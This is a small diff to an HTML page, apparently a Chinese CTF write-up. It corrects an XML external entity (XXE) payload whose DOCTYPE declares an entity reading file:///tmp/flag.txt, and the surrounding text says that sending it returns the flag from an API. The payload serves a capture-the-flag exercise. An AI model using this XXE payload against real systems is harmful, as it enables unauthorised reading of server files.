@@ -424,7 +424,7 @@
 <span class="token doctype">&lt;!DOCTYPE a[
 &lt;!ENTITY xxe SYSTEM “file:///tmp/flag.txt”></span>
 ]>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>something</span><span class="token punctuation">></span></span><span class="token entity" title="&any;">&amp;any;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>something</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>something</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>something</span><span class="token punctuation">></span></span>
 </code></pre>
 <p>然后发送数据包，就可得到api返回的flag了。</p>
 </blockquote>
